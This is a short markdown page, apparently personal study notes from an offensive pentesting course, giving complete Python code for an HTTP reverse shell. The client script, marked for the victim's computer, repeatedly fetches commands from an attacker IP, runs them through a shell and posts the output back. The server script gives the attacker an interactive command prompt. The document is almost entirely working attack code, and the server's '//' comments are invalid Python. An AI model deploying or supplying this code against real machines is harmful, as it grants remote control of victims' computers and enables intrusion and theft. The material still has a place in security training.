---
title: Coding an http reverse shell
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - python
  - python pentesting
  - scripting
  - reverse shell
---

#  Coding an http reverse shell

From course: Python For Offensive PenTest: A Complete Practical Course

## Client side

To be run on victim's computer.

```bash
# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2

import requests
import subprocess
import time

while True:

    req = requests.get('http://192.168.0.152:8080') # Send GET request to our kali server
    command = req.text # Store the received txt into command variable

    if 'terminate' in command:
        break

    else:
        CMD = subprocess.Popen(command, shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.0.152:8080', data=CMD.stdout.read()) # POST the result
        post_response = requests.post(url='http://192.168.0.152:8080', data=CMD.stderr.read()) # or the error -if any-

    time.sleep(3)

```


## Server side

To be run on attacker's computer.

```bash
# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2

import http.server

HOST_NAME = "192.168.0.152" // our attacker machine
PORT_NUMBER = 8080 // attacker listening port

class MyHandler(http.server.BaseHTTPRequestHandler): # MyHandler defines what we should do when we receive a GET/POST

    def do_GET(self):

        command = input("Shell> ")
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(command.encode())

    def do_POST(self):

        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-length']) #Define the length which means how many bytes the HTTP POST data contains, the length value has to be integer
        postVar = self.rfile.read(length)
        print(postVar.decode())

if __name__ == "__main__":

    # We start a server_class and create httpd object and pass our kali IP,port number and class handler(MyHandler)
    server_class = http.server.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
    try:
        httpd.serve_forever() # start the HTTP server, however if we got ctrl+c we will Interrupt and stop the server
    except KeyboardInterrupt:
        print('[!] Server is terminated')
        httpd.server_close()


```